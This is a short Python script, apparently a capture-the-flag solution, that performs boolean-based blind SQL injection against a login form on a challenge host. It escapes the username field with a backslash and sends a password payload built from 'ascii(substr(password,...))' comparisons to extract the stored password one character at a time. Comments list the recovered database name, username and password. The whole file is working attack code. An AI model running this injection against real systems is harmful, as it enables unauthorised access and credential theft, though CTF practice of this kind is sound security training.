import requests
import string

url = 'http://42c65e79-aa90-457c-a8fd-fef5d1c22b8d.node3.buuoj.cn/index.php'
ans = ''

#database()==p3rh4ps
#username==admin
#password==OhyOuFOuNdit

chrs = string.printable

for i in range(1, 40):
    for j in chrs:
        payload = "or (if(ascii(substr(password,%s,1))>%s,1,0))#" % (str(i), str(ord(j)))
        
        res1 = requests.post(url, data={'username': '\\', 'password': payload})
        res2 = requests.post(url, data={'username': '\\', 'password': payload.replace('>', '<')})

        if 'P3rh4ps' in res1.text:
            if 'P3rh4ps' in res2.text:
                ans += j
                print(ans)
                break